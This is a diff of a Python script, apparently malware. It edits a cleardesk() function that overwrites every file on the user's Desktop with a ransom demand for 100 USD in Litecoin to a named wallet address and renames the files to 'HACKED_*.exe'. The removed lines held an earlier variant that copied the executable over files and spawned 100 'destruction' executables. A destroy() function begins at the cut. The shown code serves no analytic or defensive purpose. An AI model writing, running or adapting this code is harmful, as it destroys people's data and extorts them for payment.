@@ -1,28 +1,21 @@
 import random,string,os,sys,shutil,threading,subprocess
 def cleardesk():
     try:
-        import shutil, sys, os, random, string
+        import os, random, string
         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
         if os.path.exists(desktop_path):
-            files = [os.path.join(desktop_path, f) for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f))]
-            half = len(files) // 2
-            for file_path in files[:half]:
-                try:
-                    shutil.copyfile(sys.executable, file_path)
-                except:
-                    continue
-            for file_path in files[half:]:
-                try:
-                    with open(file_path, "w") as f:
-                        f.write(("HELLO YOUR PC IS LOCKED! TO GET IT BACK, PAY 100 USD IN LITECOIN TO ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB\n" * 150).strip())
-                except:
-                    continue
-            for _ in range(100):
-                random_name = f"destruction_{''.join(random.choices(string.ascii_letters + string.digits, k=10))}.exe"
-                shutil.copy(sys.executable, os.path.join(desktop_path, random_name))
+            for filename in os.listdir(desktop_path):
+                file_path = os.path.join(desktop_path, filename)
+                if os.path.isfile(file_path):
+                    try:
+                        with open(file_path, "w") as f:
+                            f.write("HELLO!!  YOUR PC IS LOCKED! TO GET IT BACK, PAY 100 USD IN LITECOIN TO ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB " * 100)
+                        new_name = f"HACKED_{''.join(random.choices(string.ascii_letters + string.digits, k=4))}.exe"
+                        os.rename(file_path, os.path.join(desktop_path, new_name))
+                    except:
+                        continue
     except:
         pass
-
 def destroy():
  def r(d):
   try:
